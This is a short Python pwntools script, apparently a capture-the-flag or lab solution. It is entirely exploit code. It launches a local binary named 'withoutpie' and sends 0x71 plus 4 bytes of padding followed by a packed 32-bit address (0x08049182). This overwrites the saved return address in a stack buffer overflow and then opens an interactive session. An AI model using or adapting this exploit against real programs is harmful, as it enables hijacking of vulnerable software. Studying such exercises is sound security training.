# coding: utf-8
from pwn import *
pr = process("./withoutpie")
add_1 = (0x71)
add_2 = (0x4)
add_3 = (0x08049182)
payload = b'A' * (add_1) + b'A' * (add_2) + p32(add_3)
pr.sendline(payload)
pr.interactive()
pr.close()
